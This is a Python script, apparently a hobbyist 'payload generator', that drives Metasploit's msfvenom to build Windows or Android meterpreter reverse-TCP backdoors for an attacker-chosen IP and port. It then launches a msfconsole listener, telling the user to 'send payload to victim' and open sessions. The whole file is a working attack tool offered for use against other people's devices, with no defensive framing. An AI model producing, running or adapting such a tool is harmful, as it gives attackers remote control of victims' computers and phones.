import os
os.system("clear")
os.system("apt-get install metasploit -y")
os.system("clear")
print("""
███████╗███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
╚════██║██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██╔╝███████╗██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██╔╝ ╚════██║██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║  ███████║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

""")
print("""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝

""")
payload = input("payload type android or windows ? ")
os.system("ifconfig")
ip = input("Your ip addres : ")
port = input("Your port : ")
name = input("Payload name ? ")
if payload == "windows":
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
elif payload == "android":
      os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
use = input("You use kali or termux ? ")
if use == "termux" and payload == "windows":
    os.system("mv "+name+".exe /sdcard")
    print("-------------------------")
    print("payload save in sdcard")
    print("-------------------------")
elif use == "termux" and payload == "android":
      os.system("mv "+name+".apk /sdcard")
      print("-------------------------")
      print("payload save in sdcard")
      print("-------------------------")
if use == "kali" and payload == "windows":
    os.system("mv "+name+".exe /root/Desktop/")
    print("-------------------------")
    print("payload save in Desktop")
    print("-------------------------")
elif use == "kali" and payload == "android":
      os.system("mv "+name+".apk /root/Desktop/")
      print("-------------------------")
      print("payload save in Desktop")
      print("-------------------------")
you = input("You want listen in payload Y/n ? ")
if you == "n":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     os.system("ls")
if you == "N":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     os.system("ls")
elif you == "Y":
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
elif you == "y":
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
